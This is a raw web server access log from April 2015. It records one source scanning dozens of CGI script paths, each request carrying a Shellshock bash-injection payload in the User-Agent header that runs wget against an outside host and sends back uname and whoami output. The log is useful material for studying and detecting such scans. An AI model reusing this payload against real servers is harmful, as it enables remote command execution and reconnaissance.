"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"180.234.44.185","-","2015-04-12 19:28:58","GMT-0700","GET","/cgi-bin/zml.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:01","GMT-0700","GET","/cgi-bin/wrap.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:03","GMT-0700","GET","/cgi-bin/whois/whois.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:04","GMT-0700","GET","/cgi-bin/whois.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:05","GMT-0700","GET","/cgi-bin/webspirs.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:06","GMT-0700","GET","/cgi-bin/webmap.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:08","GMT-0700","GET","/cgi-bin/webif.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:11","GMT-0700","GET","/cgi-bin/way-board/way-board.cgi",404,553,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:12","GMT-0700","GET","/cgi-bin/way-board.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:13","GMT-0700","GET","/cgi-bin/w3mman2html.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:14","GMT-0700","GET","/cgi-bin/vpasswd.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:14","GMT-0700","GET","/cgi-bin/vote.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:15","GMT-0700","GET","/cgi-bin/virgil.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:16","GMT-0700","GET","/cgi-bin/viralator.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:18","GMT-0700","GET","/cgi-bin/urlcount.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:19","GMT-0700","GET","/cgi-bin/upload.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:20","GMT-0700","GET","/cgi-bin/ultraboard.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:21","GMT-0700","GET","/cgi-bin/troops.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:22","GMT-0700","GET","/cgi-bin/traffic.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:23","GMT-0700","GET","/cgi-bin/title.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:23","GMT-0700","GET","/cgi-bin/tigvote.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:24","GMT-0700","GET","/cgi-bin/tidfinder.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:27","GMT-0700","GET","/cgi-bin/test/test.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:28","GMT-0700","GET","/cgi-bin/test.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:28","GMT-0700","GET","/cgi-bin/test-cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:29","GMT-0700","GET","/cgi-bin/technote/main.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:30","GMT-0700","GET","/cgi-bin/talkback.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"54.166.254.243","-","2015-04-12 19:29:31","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36"
"180.234.44.185","-","2015-04-12 19:29:32","GMT-0700","GET","/cgi-bin/store/index.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:32","GMT-0700","GET","/cgi-bin/store/agora.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:35","GMT-0700","GET","/cgi-bin/spin_client.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:36","GMT-0700","GET","/cgi-bin/sojourn.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:38","GMT-0700","GET","/cgi-bin/smartsearch/smartsearch.cgi",404,557,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:41","GMT-0700","GET","/cgi-bin/simplestmail.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:42","GMT-0700","GET","/cgi-bin/simplestguest.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:43","GMT-0700","GET","/cgi-bin/showcheckins.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:43","GMT-0700","GET","/cgi-bin/shopplus.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:46","GMT-0700","GET","/cgi-bin/sendform.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:47","GMT-0700","GET","/cgi-bin/search/search.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:48","GMT-0700","GET","/cgi-bin/search.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:49","GMT-0700","GET","/cgi-bin/scoadminreg.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:50","GMT-0700","GET","/cgi-bin/sbcgi/sitebuilder.cgi",404,551,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:51","GMT-0700","GET","/cgi-bin/robpoll.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:52","GMT-0700","GET","/cgi-bin/robadmin.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:53","GMT-0700","GET","/cgi-bin/responder.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:55","GMT-0700","GET","/cgi-bin/register.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:55","GMT-0700","GET","/cgi-bin/ratlog.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:56","GMT-0700","GET","/cgi-bin/r.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:58","GMT-0700","GET","/cgi-bin/quickstore.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:59","GMT-0700","GET","/cgi-bin/publisher/search.cgi",404,550,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:29:59","GMT-0700","GET","/cgi-bin/profile.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:00","GMT-0700","GET","/cgi-bin/probecontrol.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:05","GMT-0700","GET","/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi",404,557,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:06","GMT-0700","GET","/cgi-bin/php.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:07","GMT-0700","GET","/cgi-bin/photo/protected/manage.cgi",404,556,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:07","GMT-0700","GET","/cgi-bin/photo/manage.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:08","GMT-0700","GET","/cgi-bin/phf.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:09","GMT-0700","GET","/cgi-bin/pfdisplay.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:10","GMT-0700","GET","/cgi-bin/perlshop.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:12","GMT-0700","GET","/cgi-bin/pagelog.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:13","GMT-0700","GET","/cgi-bin/nph-test.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:15","GMT-0700","GET","/cgi-bin/nph-exploitscanget.cgi",404,552,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:15","GMT-0700","GET","/cgi-bin/nph-emumail.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:16","GMT-0700","GET","/cgi-bin/nlog-smb.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:17","GMT-0700","GET","/cgi-bin/newsdesk.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:18","GMT-0700","GET","/cgi-bin/netpad.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:18","GMT-0700","GET","/cgi-bin/netauth.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:19","GMT-0700","GET","/cgi-bin/myguestbook.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:20","GMT-0700","GET","/cgi-bin/musicqueue.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:21","GMT-0700","GET","/cgi-bin/mt/mt-load.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:21","GMT-0700","GET","/cgi-bin/mt/mt-check.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:22","GMT-0700","GET","/cgi-bin/mt-static/mt-load.cgi",404,551,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:23","GMT-0700","GET","/cgi-bin/mt-static/mt-check.cgi",404,552,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:24","GMT-0700","GET","/cgi-bin/mrtg.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:25","GMT-0700","GET","/cgi-bin/mojo/mojo.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:28","GMT-0700","GET","/cgi-bin/mmstdod.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:29","GMT-0700","GET","/cgi-bin/mini_logger.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:30","GMT-0700","GET","/cgi-bin/man.sh",404,536,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:31","GMT-0700","GET","/cgi-bin/main.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:32","GMT-0700","GET","/cgi-bin/mailnews.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:34","GMT-0700","GET","/cgi-bin/mail/nph-mr.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:35","GMT-0700","GET","/cgi-bin/mail/emumail.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:36","GMT-0700","GET","/cgi-bin/magiccard.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:37","GMT-0700","GET","/cgi-bin/lwgate.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:38","GMT-0700","GET","/cgi-bin/lookwho.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:39","GMT-0700","GET","/cgi-bin/logit.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:39","GMT-0700","GET","/cgi-bin/login.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:40","GMT-0700","GET","/cgi-bin/log-reader.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:41","GMT-0700","GET","/cgi-bin/loadpage.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:42","GMT-0700","GET","/cgi-bin/lastlines.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:42","GMT-0700","GET","/cgi-bin/journal.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:44","GMT-0700","GET","/cgi-bin/infosrch.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:45","GMT-0700","GET","/cgi-bin/ImageFolio/admin/admin.cgi",404,556,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:45","GMT-0700","GET","/cgi-bin/imageFolio.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:47","GMT-0700","GET","/cgi-bin/ikonboard/help.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:48","GMT-0700","GET","/cgi-bin/if/admin/nph-build.cgi",404,552,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:50","GMT-0700","GET","/cgi-bin/htsearch.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:52","GMT-0700","GET","/cgi-bin/html2wml.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:52","GMT-0700","GET","/cgi-bin/html2chtml.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:53","GMT-0700","GET","/cgi-bin/hsx.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:54","GMT-0700","GET","/cgi-bin/hitview.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:56","GMT-0700","GET","/cgi-bin/handler.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:30:57","GMT-0700","GET","/cgi-bin/guestbook.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
